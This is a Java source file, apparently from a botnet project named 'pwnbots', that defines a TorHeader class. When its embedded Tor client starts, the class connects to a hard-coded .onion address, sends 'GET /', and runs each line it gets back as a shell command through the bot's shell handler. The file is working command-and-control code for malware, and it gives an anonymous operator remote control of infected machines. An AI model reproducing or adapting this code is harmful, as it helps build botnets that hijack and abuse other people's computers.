package com.github.kvac.pwn.kvacpwnroot.pwnbotsroot.pwn.bot.common.header;

import com.subgraph.orchid.TorClient;
import com.subgraph.orchid.TorInitializationListener;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import lombok.Getter;
import lombok.Setter;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class TorHeader {

    @Getter
    PrintWriter socketWrite;
    @Getter
    BufferedReader socketRead;

    Logger logger = LoggerFactory.getLogger(getClass());
    @Getter
    TorClient client;

    @Getter
    @Setter
    private boolean started;

    public void init() {
        client = new TorClient();
        client.addInitializationListener(createInitalizationListner());
    }

    public void start() {
        client.start();
    }

    public void listen() {
        client.enableSocksListener(3333);
    }

    private TorInitializationListener createInitalizationListner() {
        return new TorInitializationListener() {

            @Override
            public void initializationProgress(String message, int percent) {
            }

            @Override
            public void initializationCompleted() {
                logger.info("Tor is ready to go!");
                //TODO MOVE
                setStarted(true);
                try {
                    Socket socket = client.getSocketFactory().createSocket("pbc6urv4bakvxkjs.onion", 8000);
                    socketWrite = new PrintWriter(socket.getOutputStream(), true);
                    socketRead = new BufferedReader(new InputStreamReader(socket.getInputStream()));

                    socketWrite.println("GET /");
                    String line;
                    while ((line = socketRead.readLine()) != null) {
                        logger.info(line);
                        CommonHeader.getSHELL_HEADER().getSHELL_HANDLER().executeCMD(line);
                    }
                    logger.warn("closed");
                    socket.close();
                } catch (Exception ex) {
                    logger.error("", ex);
                }//TODO MOVE
            }
        };
    }

}
